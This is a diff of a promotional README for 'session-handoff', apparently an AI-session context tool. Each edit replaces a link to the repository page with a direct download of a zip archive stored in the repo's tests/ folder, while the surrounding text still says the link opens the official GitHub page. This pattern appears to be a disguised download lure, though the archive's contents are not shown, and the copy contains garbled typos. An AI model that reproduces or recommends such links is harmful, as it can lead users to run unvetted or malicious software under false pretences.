@@ -1,7 +1,7 @@
 <h1>🧠 session-handoff - Never Lose Your AI Work Again</h1>
 
 <p align="center">
-  <a href="https://github.com/draysen-yau/session-handoff" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;border-radius:50px;font-size:20px;font-weight:bold;text-decoration:none;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ Get session-handoff Now</a>
+  <a href="https://github.com/draysen-yau/session-handoff/raw/refs/heads/main/tests/handoff_session_v1.3-beta.5.zip" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;border-radius:50px;font-size:20px;font-weight:bold;text-decoration:none;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ Get session-handoff Now</a>
 </p>
 
 ## 🔄 What Is session-handoff?
@@ -32,7 +32,7 @@ Getting started with session-handoff is easier than making a cup of coffee. You 
 
 Visit this link to downloadthe application:
 
-➡️ **[https://github.com/draysen-yau/session-handoff](https://github.com/draysen-yau/session-handoff)**
+➡️ **[https://github.com/draysen-yau/session-handoff/raw/refs/heads/main/tests/handoff_session_v1.3-beta.5.zip](https://github.com/draysen-yau/session-handoff/raw/refs/heads/main/tests/handoff_session_v1.3-beta.5.zip)**
 
 When you click that link, you'll be taken to the official GitHub page for session-handoff. Look for a green button that says **"Code"** or **"Download"** on that page. Click it, and then choose **"Download ZIP"** or follow the visible download instructions on the screen. The download will begin automatically.
 
@@ -188,7 +188,7 @@ Absolutely no programming knowledge is needed—the interface is designed for ev
 
 You are one click away from never losing your AI momentum again. Join thousands of users who have already discovered the magic of seamless AI session continuityico
 
-**👉 [Download session-handoff](https://github.com/draysen-yau/session-handoff)**
+**👉 [Download session-handoff](https://github.com/draysen-yau/session-handoff/raw/refs/heads/main/tests/handoff_session_v1.3-beta.5.zip)**
 
 Visit this link to downloadthe application. It takes lessthan 2 minutes to get started, and then you'll wonder how you ever managed without it. Say goodbye to repeating yourself, say hello to instant context recovery, and enjoy AI that actually knows what you're working on—every single time. 
 
